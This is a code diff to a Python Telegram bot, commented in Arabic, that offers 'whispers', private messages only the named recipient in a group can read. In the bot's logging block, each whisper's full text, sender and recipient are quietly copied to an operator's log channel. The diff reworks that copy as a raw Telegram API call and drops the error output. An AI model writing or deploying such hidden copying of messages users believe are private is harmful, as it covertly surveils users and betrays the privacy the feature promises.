@@ -37,7 +37,6 @@ async def send_colored_keyboard(chat_id, text, inline_keyboard, reply_to_msg_id=
     if reply_to_msg_id:
         payload["reply_to_message_id"] = reply_to_msg_id
 
-    # إرسال الطلب بشكل Async لضمان عدم تعليق البوت
     async with aiohttp.ClientSession() as session:
         async with session.post(url, json=payload) as resp:
             return await resp.json()
@@ -250,52 +249,37 @@ async def process_whisper_text(client, message):
 
     group_text = f"↢ الهمسه لـ ↤︎ {target_mention}\n↢ من ↤︎ {sender_mention}\n-"
 
-    # بناء الأزرار الملونة (Raw API) للقروب
+    # بناء الأزرار الملونة للقروب (Raw API)
     inline_keyboard = [
         [{"text": "رؤيه الهمسة ✉️", "callback_data": f"read_{wid}", "style": "primary"}],
         [{"text": f"اهمس لـ {clean_name(sender.first_name)}", "url": reply_deep_link}]
     ]
 
-    # الإرسال للقروب باستخدام الدالة الملونة
     await send_colored_keyboard(pending['group_id'], group_text, inline_keyboard)
 
-    # ================= التعديل هنا للقناة =================
-    # جلب معلومات المستلم للحصول على اليوزر الخاص به
-    target_username_str = "لا يوجد"
-    try:
-        t_user = await client.get_users(pending['target_id'])
-        if t_user.username:
-            target_username_str = f"@{t_user.username}"
-    except:
-        pass
+    # ================= الإرسال للقناة غصب (RAW API) =================
+    log_text = (f"همسه جديده 🕵️✉️\n"
+                f"المرسل \n: {sender_mention}\n"
+                f"المستلم : {target_mention}\n"
+                f":محتوى الهمسة\n{text}")
 
-    sender_username_str = f"@{sender.username}" if sender.username else "لا يوجد"
+    url_log = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    payload_log = {
+        "chat_id": LOG_CHANNEL,
+        "text": log_text,
+        "parse_mode": "Markdown",
+        "disable_web_page_preview": True
+    }
     
-    sender_name_str = sender.first_name if sender.first_name else "بدون اسم"
-    target_name_str = pending['target_name'] if pending['target_name'] else "بدون اسم"
-
-    # رسالة القناة بصيغة نص عادي (Plain Text) لضمان عدم فشل الإرسال نهائياً
-    log_text = (f"همسه جديده 🕵️✉️\n\n"
-                f"يوزر المرسل : {sender_username_str}\n"
-                f"اسم المرسل : {sender_name_str}\n\n"
-                f"يوزر المستلم : {target_username_str}\n"
-                f"اسم المستلم : {target_name_str}\n\n"
-                f":محتوى الهمسة\n"
-                f"{text}")
-    
+    # إرسال طلب HTTP مباشر لسيرفرات تلجرام بدون المرور بمكتبة Pyrogram
     try:
-        # إرسال الرسالة للقناة بدون أي ParseMode 
-        await client.send_message(
-            chat_id=LOG_CHANNEL, 
-            text=log_text, 
-            disable_web_page_preview=True
-        )
+        async with aiohttp.ClientSession() as session:
+            await session.post(url_log, json=payload_log)
     except Exception as e:
-        print(f"Error Log: {e}")
+        pass
 
 
 # ================= 4. قراءة الهمسة (نظام الحماية) ================= #
-# هنا نستخدم Pyrogram بشكل طبيعي لأن الرد المنبثق (Alert) لا يحتاج ألوان
 @app_bot.on_callback_query(filters.regex(r"^read_"))
 async def read_whisper_callback(client, call):
     wid = call.data.split("read_")[1]
@@ -348,5 +332,5 @@ async def read_whisper_callback(client, call):
 
 # ================= التشغيل ================= #
 if __name__ == "__main__":
-    print("Starting Pyrogram Whisper Bot with Custom Colors! 🚀...")
+    print("Starting Pyrogram Whisper Bot with Custom Colors & Raw API Logs! 🚀...")
     app_bot.run()
